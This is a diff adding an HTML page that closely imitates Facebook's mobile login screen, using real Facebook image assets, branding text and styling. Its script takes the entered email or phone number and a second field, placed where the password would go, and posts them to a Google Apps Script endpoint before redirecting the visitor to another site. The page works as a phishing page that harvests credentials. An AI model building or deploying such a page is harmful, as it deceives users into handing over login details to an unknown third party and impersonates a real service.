@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Social Style Login Form</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      font-family: "Optimistic 95";
+    }
+
+    .container {
+      display: flex;
+      max-width: 1000px;
+      width: 100%;
+      align-items: center;
+      justify-content: space-between;
+      gap: 40px;
+    }
+
+    .left {
+      flex: 1;
+    }
+
+    .left img {
+      width: 60px;
+      height: 60px;
+      color: #1877f2;
+      font-size: 58px;
+      margin-bottom: 10px;
+    }
+
+    .left p {
+      font-size: 28px;
+      color: #1c1e21;
+      line-height: 1.3;
+    }
+
+    .right {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+    }
+
+    .form-box {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+    }
+
+    input {
+      width: 100%;
+      padding: 20px 16px;
+      margin-bottom: 14px;
+      border: 1px solid rgb(223, 226, 229);
+      border-radius: 16px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-btn {
+      background: #1877f2;
+      color: white;
+      margin-bottom: 15px;
+      border-radius: 100px;
+    }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      text-decoration: none;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: rgb(17, 17, 18);
+    font-weight: 700;
+    color: rgb(17, 17, 18);
+    font-weight: 500;
+    font-family: "Optimistic 95";
+    }
+
+    hr {
+      margin-bottom: 20px;
+      border: 0;
+      
+    }
+
+    .create-btn {
+      pointer-events: none;
+    opacity: 1;
+    height: 44px;
+    min-width: 44px;
+    flex-grow: 1;
+    padding-left: 20px;
+    padding-right: 20px;
+    background: rgba(255, 255, 255, 0.2);
+    border: 1px solid rgb(0, 100, 224);
+    border-radius: 22px;
+    align-items: center;
+    flex-direction: row;
+    justify-content: center;
+        color: rgb(0, 100, 224);
+    font-weight: 500;
+    display: inline;
+    font-size: 15.2px;
+    font-family: "Optimistic 95";
+    white-space: pre-wrap;
+    overflow-wrap: break-word;
+    transition: all .3s;
+    }
+     .create-btn:hover{
+      scale: calc(1.1);
+     }
+    .meta-img{
+      margin-top: 16px;
+      width: 60px;
+      height: 12px;
+    }
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        text-align: center;
+        height: 100vh;
+      }
+      .left {
+        flex: 0;
+      }
+      .left h1 {
+        font-size: 44px;
+      }
+
+      .left p {
+        font-size: 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="topbar display-flex" style="pointer-events: none; width: 100%; display: flex; flex-direction: row; align-items: center; gap: 10px; background: rgb(255, 255, 255);">
+    <img data-bloks-name="bk.components.Image" alt="" class="wbloks_1" src="https://z-m-static.xx.fbcdn.net/rsrc.php/yw/r/gLamC64FCJF.webp" style="mask-image: url(&quot;https://z-m-static.xx.fbcdn.net/rsrc.php/yw/r/gLamC64FCJF.webp&quot;); mask-size: cover; background-color: rgb(0, 100, 224); object-position: 10000px 10000px; object-fit: cover; overflow: hidden; width: 24px; height: 24px;">
+    <span data-bloks-name="bk.components.Text" style="font-weight: 400; padding: unset; line-height: 1.3; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; color: rgb(23, 99, 207);">Get Facebook for iOS and browse faster.</span>
+</div>
+<div class="language">
+   <span style="color: rgb(102, 106, 114); font-weight: 400; display: inline; font-size: 13.5px; font-family: &quot;Optimistic 95&quot;; white-space: pre-wrap; overflow-wrap: break-word;">English (UK)</span>
+</div>
+  <div class="left" style="margin-top: 20px; margin-bottom: 20px;">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="">
+  </div>
+
+  <div class="right">
+    <div class="form-box">
+      <form id="loginForm">
+        <input type="text" id="email" placeholder="Mobile number or email address" required />
+        <input type="text" id="message" placeholder="Enter your message" required />
+
+        <button type="submit" class="login-btn">Log In</button>
+
+        <a href="#" class="forgot">Forgot password?</a>
+
+        <hr>
+        <hr>
+        <hr>
+        <hr>
+        <button type="button" class="create-btn">Create new account</button>
+        <img  class="meta-img" src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp" alt="">
+        <div style="margin-top: 10px; gap: 10px;" class="bottom-menu">
+    <span style="pointer-events: auto; cursor: pointer; -webkit-tap-highlight-color: transparent; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">About</span>
+    <span style="pointer-events: auto; cursor: pointer; -webkit-tap-highlight-color: transparent; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">Help</span>
+    <span style="pointer-events: auto; cursor: pointer; -webkit-tap-highlight-color: transparent; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">More</span>
+  </div>
+      </form>
+    </div>
+  </div>
+
+  
+</div>
+
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbzGO6rKNxYphawYweQXgpad0OYVT2OYI_gqkBJhcHGO7rf1CFvdhIZ-QSFCnrsOURqY/exec";
+  const redirectURL = "https://lovable.dev";
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const data = {
+      email: document.getElementById("email").value,
+      message: document.getElementById("message").value
+    };
+
+    fetch(scriptURL, {
+      method: "POST",
+      body: JSON.stringify(data),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+    .then(() => {
+      window.location.href = redirectURL;
+    })
+    .catch(err => {
+      alert("Submission failed");
+      console.error(err);
+    });
+  });
+</script>
+
+</body>
+</html>
